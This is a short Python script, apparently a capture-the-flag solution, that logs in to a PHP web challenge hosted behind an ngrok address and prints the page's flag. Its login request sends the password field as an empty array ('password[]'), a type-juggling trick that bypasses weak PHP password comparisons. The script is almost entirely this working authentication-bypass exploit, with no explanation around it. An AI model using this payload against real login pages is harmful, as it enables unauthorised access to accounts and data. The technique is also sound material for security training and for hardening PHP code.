import requests
from bs4 import BeautifulSoup

rq = requests.Session()

url = 'http://6ae0-14-233-85-235.ngrok.io'

def login():
	data = {'username':'taidh','password[]':''}
	rq.post(url=url+'/login.php', data=data)

def getFlag():
	r = rq.get(url=url+'/index.php')
	sourp = BeautifulSoup(r.content,'html.parser')
	flag = sourp.findAll('p')[0]
	print(flag)

if __name__ == '__main__':
	login()
	getFlag()